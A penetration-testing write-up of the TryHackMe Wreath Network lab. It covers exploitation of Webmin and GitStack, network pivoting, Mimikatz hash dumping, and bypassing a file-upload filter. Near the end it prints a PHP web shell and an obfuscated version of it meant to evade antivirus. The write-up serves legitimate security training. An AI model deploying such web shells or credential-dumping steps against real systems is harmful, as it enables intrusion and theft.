# Wreath-Network-Pen-Test
A write up of a pen test of the Wreath Network on TryHackMe



## Walkthrough

## Enumeration of Web Server

A quick scan reveals a few services open on the reachable web server: 

![Screenshot 2023-06-05 121320](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/3fcfa5a6-1bb2-45ac-86ce-96b7c07f7700)

The website doesn't is only accessible after adding the IP to the local /hosts file:



![Screenshot 2023-06-05 122838](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/dd56e8db-1b2f-4e30-950e-70c93d6199e3)

Running a quick vulnerability script against the site reveals a potential weak point - the server is running MiniServ 1.890 which (after some brief research) is vulnerable to command injection (CVE-2019-15107): 

![Screenshot 2023-06-05 123211](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/61260bef-9673-44d2-9f12-9cde361fe007)


![Screenshot 2023-06-05 123525](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/2ec93739-f096-4de2-90ad-535f65a5b4a4)

## Exploitation of Web Server
I used the following tool to exploit this vulnerability: https://github.com/MuirlandOracle/CVE-2019-15107

After configuring and running the script, I was granted a root shell on the server:
![Screenshot 2023-06-05 125304](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/c9c97089-e9fd-47cf-aa64-8e53db929eea)

Following this, I made a copy of both the root password hash and ssh private key for future access.

# Pivoting 

## Git server Enumeration

Using a static nmap binary, supplied by my attacking machine, I scanned the internal network for other hosts within scope for potential targets to pivot to.

![Screenshot 2023-06-06 105002](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/4608d90f-7fc2-4d1a-81e3-317be8d40e96)


![Screenshot 2023-06-06 104945](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/6471e710-0afd-40b7-addb-cfa971bec375)

Scan result:

![Screenshot 2023-06-06 105638](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/06f8e8cc-5eae-48e8-afec-3c7f157d3487)

Success, both .150 and .100 machines are fair game.
Futher scanning of each machine individually revealed a few services running on .150 (including a web page) so I decided to attempt to pivot to this machine.
This was done using sshuttle - a program that works in a similar manner to a VPN, allowing direct connection to remote devices as if they were local.
I was able to sign in as root on this machine using the SSH key from earlier. 

![Screenshot 2023-06-06 111757](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/d6433b0f-5dfe-417a-8190-0bf627827211)


Navigating to the web page hosted by 1.50 didn't reveal much, however poor error handling practices pointed me towards a potential attack vector.

![Screenshot 2023-06-06 112503](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/c427dd99-2315-4e9d-96d1-c07c2dc66c94)


![Screenshot 2023-06-06 112608](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/17ec55a5-6cd0-40e0-8d6d-d951f9ce1de4)

(Sadly the default credentials didn't work).

## Git server Exploitation 

After a little research, I found a Remote Code Execution exploit that could be used against the GitStack page: https://www.exploit-db.com/exploits/43777

Upon editing the exploit to my needs (changing target, ports etc), I ran it and saw that commands were indeed being executed via a webshell:

Shell function snippit:

![Screenshot 2023-06-06 120701](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/d69d5b5b-908b-4762-8a30-0236eb650cc7)


In action:

![Screenshot 2023-06-06 120500](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/381ac367-3fda-4cef-9e14-9a86d91aa7a6)

In order to efficiently execute commands & gain information about the machine, I used BurpSuite to interact with the device:

![Screenshot 2023-06-06 121901](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/f4080a43-904e-4a44-96fd-2fd3955cbaa8)


In order to deploy a shell, the .150 machine needed to be able to reach/ communicate with my machine.
I tested this via `ping` using the exploit and `tcpdump` on my machine, however no traffic was getting through successfully, indicating that it was being blocked (likely by a firewall).
To navigate this issue, I opened a port, allowing traffic through the firewall:

![Screenshot 2023-06-07 103640](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/2faf878d-3098-4288-8de7-59bae31cca4f)

Next I set up a Netcat listener on the .200 machine, and used a Powershell command to create a shell to call back to it:


![Screenshot 2023-06-07 110211](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/d280e7b2-4fe7-41f5-912e-35a0004d1c2e)

Shortly after, I was rewarded with Administrator level access to the Git server:


![Screenshot 2023-06-07 110231](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/75ee96a3-3a35-4742-a369-7ee1df40ff9d)

From earlier enumeration, ports 3389(RDP GUI) and 5985(WinRM CLI) were found to be open. 
Given that I was using an Admin account, I could create myself a new account that would be able to access the device via RDP whenever I wanted.


![Screenshot 2023-06-07 110736](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/f4ceac67-2448-445b-a0ba-190117c81775)


To connect over RDP from Ubuntu, I used xfreerdp:

![Screenshot 2023-06-07 111609](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/c2827aab-1a19-4ed9-9cd7-4a0832264a47)

And created a share for easy tool access:

![Screenshot 2023-06-07 111847](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/3f71d2e1-9687-4f58-9186-4cc96688117e)

Using this share, I was able to launch Mimikatz in order to dump local SAM hashes:



![Screenshot 2023-06-07 112800](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/e482e10b-dfb4-45c3-af2d-07ff5eb7c8cd)

From here, I used :

`privilege::debug` essentially grants the process higher privileges, enabling it to bypass certain security restrictions.
`token::elevate` attempts to elevate the current user's access token to a higher privilege level.

Followed by `lsadump::sam` to get the hashes:



![Screenshot 2023-06-07 113153](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/f661470b-a432-4760-aab9-c201bb186365)

After a few unsuccessful attempts and a wait, I managed to crack the hash for the user Thomas.


Using the Admin hash I was able to connect to the machine via WinRM for total exploitation of the .150 machine:



![Screenshot 2023-06-07 113614](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/46e28889-287e-428b-b7c4-57221d1cef8a)


## Personal Pc Enumeration

Referring back to the Network Map, only the personal PC remained to be compromised:

![Screenshot 2023-06-06 123740](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/69e2c024-c647-4943-b284-6b655abfc086)

As mentioned in the brief, this machine has an Anti-virus installed, so I had to be aware of this going forward.
As the .100 machine (personal PC) is only accessible from the git-server, I had to create another proxy (through the git-server) to be able to reach the .100 host.
I had previously used sshuttle to create a proxy between the Web server and Git server, and now a second one was necessary to reach the last machine. 
The traffic flow would look as follows:

Attacking Machine -> WebServer -> Git-Server -> Personal PC

Given this was a Windows host and I was now accessing it via 2 proxies, nmap was unlikely to be of much use, so I uploaded the Portscan.ps1 script from Powersploit to the machine via WinRM.
A scan of the final machine (.100) revealed ports 80 & 3389 to be open.

I used chisel (https://github.com/jpillora/chisel) to create this final proxy.
Firstly I opened a port on the git-server to allow traffic to traverse:

![Screenshot 2023-06-07 115605](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/0876f6c2-ea22-4c68-b9f6-e65ce4abbce1)

Then uploaded the chisel executable to the server and ran it:


![Screenshot 2023-06-07 123637](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/8c80b9c9-5bd5-4740-abe7-2be901a2cb5c)

On my attacking machine I set up the chisel client (tunelling traffic via socks proxy):


![Screenshot 2023-06-07 135345](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/2c40ae66-0389-43eb-b03a-b08ab1533c37)

After connecting, I used the Foxy Proxy browser extension to access the web page that was now being tunnelled from the .100 machine.

Success!



![Screenshot 2023-06-07 135313](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/a04131cd-1d9e-43df-be46-9e155607a25d)

Now, whilst the webpage is accessible and can be enumerated, this would again be occuring through 2 proxies and would be painfully slow. However, the brief mentioned that the git server is used for version control here, which presents an easier potential alternative form of enumeration.

Finding the repository was relatively easy, given the WinRM access: 

![Screenshot 2023-06-07 140203](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/a6b01593-1ca3-4c43-99e5-1bdc1389e271)

Upon downloading, I used the extractor tool from GitTools (https://github.com/internetwache/GitTools) to view readable data and ended up with 3 local directories:



![Screenshot 2023-06-07 142259](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/19225637-f910-414b-954b-18b6f531d507)

Drilling down through the directories I found the components of the web site:



![Screenshot 2023-06-07 142631](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/80c86faf-936a-45b6-b22b-ba2c9928ea9c)


Within the index.php was a funciton that allowed file uploads (thus a potential vulnerability):

![Screenshot 2023-06-07 142906](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/474b67e9-ee3d-4d5f-b15f-30ffd1951dab)


Navigating to the site within the browser reveals a login page but luckily I managed to crack Thomas' password hash earlier and was granted access:

![image](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/0023cd21-39f7-42e5-bcff-1ae85a2baf77)

Now I had to find someway to take advantage of the upload function.

There are a few checks evident in the code that I had to be aware of (common rules such as file type, size and if the file is already present) but the process of bypassing these was pretty straightforward.
Changing the file extension to .php satisfies the file type filter but the `getimagesize()` function checks specifically for images:

```

$size = getimagesize($_FILES["file"]["tmp_name"]);
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
    header("location: ./?msg=Fail");
    die();

```
`[1]` retrieves the second element from the array, which represents the file extension.
`in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts)` checks if the file extension exists in the `$goodExts` array and if the extension is not found in the array the file is not uploaded.

Indeed, a legitmate image had to be uploaded so I used exiftool to allow me to place php shell code into the image metadata.
Knowing that anti-virus is present on the machine, it would be pretty foolish to upload a file containing an obvious shell but PHP Obfuscator (https://www.gaijin.at/en/tools/php-obfuscator) provides a means of obscuring the code, increasing the liklihood that it remains undetected by anti-virus.

Eg :

```
<?php
    $cmd = $_GET["mrjokar"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

Becomes:

``` <?php \$u0=\$_GET[base64_decode('ZnJvc3Q=')];if(isset(\$u0)){echo base64_decode('PHByZT4=').shell_exec(\$u0).base64_decode('PC9wcmU+');}die();?> ```

After exiftool to embed the payload into the image, uploading it and navigating to it via URL, we can see that command execution is available.

`systeminfo`:

![image](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/f8f2434a-de84-439d-a920-fc1e39b90a92)


